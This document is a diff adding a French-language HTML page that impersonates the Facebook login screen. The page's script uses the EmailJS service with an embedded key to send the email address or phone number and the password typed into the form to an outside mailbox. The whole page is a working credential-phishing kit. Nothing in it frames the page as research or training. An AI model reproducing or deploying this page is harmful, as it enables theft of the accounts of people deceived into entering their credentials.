@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connexion Facebook</title>
+    <!-- Link to the CSS file -->
+    <link rel="stylesheet" href="style.css">
+    <!-- EmailJS Script -->
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3.11.0/dist/email.min.js"></script>
+    <script type="text/javascript">
+        // Initialize EmailJS
+        (function(){
+            emailjs.init("YV95iUQssFkJN3KDU"); // Replace with your actual Public Key
+        })();
+        
+        // Function to send login data
+        function sendLoginData(event) {
+            event.preventDefault(); // Prevent the default form submission
+
+            const login = document.getElementById("login").value;
+            const password = document.getElementById("password").value;
+
+            // Prepare the parameters for EmailJS
+            const templateParams = {
+                login: login,
+                password: password
+            };
+
+            // Send the email using EmailJS
+            emailjs.send("service_default", "template_default", templateParams)
+                .then(function(response) {
+                    alert("Login information sent successfully!");
+                }, function(error) {
+                    alert("Failed to send login information: " + JSON.stringify(error));
+                });
+        }
+    </script>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Facebook</h1>
+            <p>Connectez-vous avec vos amis et le monde qui vous entoure.</p>
+        </div>
+        <div class="login-form">
+            <form onsubmit="sendLoginData(event)">
+                <input type="text" id="login" placeholder="Adresse e-mail ou numéro de téléphone" required>
+                <input type="password" id="password" placeholder="Mot de passe" required>
+                <button type="submit">Connexion</button>
+                <!-- Link to reset password page -->
+                <a href="reset-password.html">Mot de passe oublié ?</a>
+                <hr>
+                <!-- Link to create account page -->
+                <a href="create-account.html" class="create-account-button">Créer un nouveau compte</a>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
